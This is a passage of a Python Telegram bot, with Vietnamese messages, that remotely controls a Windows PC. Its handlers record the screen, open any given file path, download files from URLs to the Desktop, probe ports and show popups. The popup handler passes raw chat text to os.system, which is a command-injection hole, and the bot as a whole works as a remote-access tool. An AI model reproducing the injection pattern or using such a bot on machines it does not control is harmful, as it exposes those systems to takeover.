                await update.message.reply_text(f"✅ Đã quay và gửi video thành công! ({frames} khung hình, {expected_time:.2f} giây)")
        except ValueError:
            await update.message.reply_text("❌ Vui lòng nhập số khung hình hợp lệ (ví dụ: '50')!")
        except Exception as e:
            await update.message.reply_text(f"❌ Lỗi khi quay màn hình: {str(e)}")
        context.user_data["waiting_for_screen_record"] = False
    elif context.user_data.get("waiting_for_play_sound"):
        try:
            if os.path.exists(msg):
                os.startfile(msg)
                await update.message.reply_text(f"✅ Đang phát file âm thanh '{msg}'!")
            else:
                await update.message.reply_text(f"❌ File âm thanh '{msg}' không tồn tại!")
        except Exception as e:
            await update.message.reply_text(f"❌ Lỗi khi phát âm thanh: {str(e)}")
        context.user_data["waiting_for_play_sound"] = False
    elif context.user_data.get("waiting_for_download"):
        try:
            url = msg
            response = requests.get(url, stream=True)
            if response.status_code == 200:
                filename = url.split("/")[-1] if "/" in url else "downloaded_file"
                desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
                filepath = os.path.join(desktop_path, filename)
                with open(filepath, "wb") as f:
                    f.write(response.content)
                await update.message.reply_text(f"✅ Đã tải file về Desktop: '{filepath}'!")
            else:
                await update.message.reply_text(f"❌ Không thể tải file từ URL '{url}', kiểm tra lại nhé!")
        except Exception as e:
            await update.message.reply_text(f"❌ Lỗi khi tải file: {str(e)}")
        context.user_data["waiting_for_download"] = False
    elif context.user_data.get("waiting_for_check_port"):
        try:
            parts = msg.split()
            if len(parts) != 2:
                await update.message.reply_text("❌ Vui lòng nhập đúng định dạng 'IP port' (ví dụ: '192.168.1.1 80')!")
            else:
                ip, port = parts[0], int(parts[1])
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    await update.message.reply_text(f"🟢 Port {port} của ip {ip} đang mở!")
                else:
                    await update.message.reply_text(f"🔴 Port {port} của ip {ip} đang đóng hoặc không kết nối được!")
                sock.close()
        except ValueError:
            await update.message.reply_text("❌ Port phải là số nguyên (ví dụ: '80')!")
        except Exception as e:
            await update.message.reply_text(f"❌ Lỗi khi kiểm tra port: {str(e)}")
        context.user_data["waiting_for_check_port"] = False
    elif context.user_data.get("waiting_for_notification"):
        try:
            os.system(f'msg * "{msg}"')
            await update.message.reply_text(f"✅ Đã hiển thị thông báo '{msg}' trên máy tính!")
        except Exception as e:
            await update.message.reply_text(f"❌ Lỗi khi gửi thông báo: {str(e)}. Có thể cần quyền admin!")
        context.user_data["waiting_for_notification"] = False

    else:
        await update.message.reply_text("ℹ️ Vui lòng chọn lệnh từ menu dưới đây!", reply_markup=main_reply_markup)

# Hàm chính để chạy bot
def main() -> None:
    application = Application.builder().token(TOKEN).connect_timeout(30).read_timeout(30).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.run_polling()

if __name__ == "__main__":
    main()